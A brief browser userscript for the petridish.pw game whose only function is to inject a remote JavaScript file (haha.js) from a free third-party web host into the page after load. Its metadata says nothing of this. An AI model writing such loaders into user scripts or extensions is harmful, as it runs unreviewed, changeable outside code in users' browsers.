// ==UserScript==
// @name         test2
// @namespace    test
// @version      24
// @description  petridish
// @author       you
// @match        http://petridish.pw/old*
// @match        http://petridish.pw/ru*
// @match        http://petridish.pw/en*
// @match        http://petridish.pw/fr*
// @match        http://petridish.pw/nl*
// @run-at       document-idle
// @grant        GM_xmlhttpRequest
// @connect      petridish.pw
// @downloadURL https://update.greasyfork.org/scripts/396460/test2.user.js
// @updateURL https://update.greasyfork.org/scripts/396460/test2.meta.js
// ==/UserScript==


window.onload = setTimeout(function() {
    'use strict';

    var script = document.createElement('script');
    script.src = 'https://mist2020.000webhostapp.com/haha.js';
    document.getElementsByTagName('body')[0].appendChild(script);

}, 1000)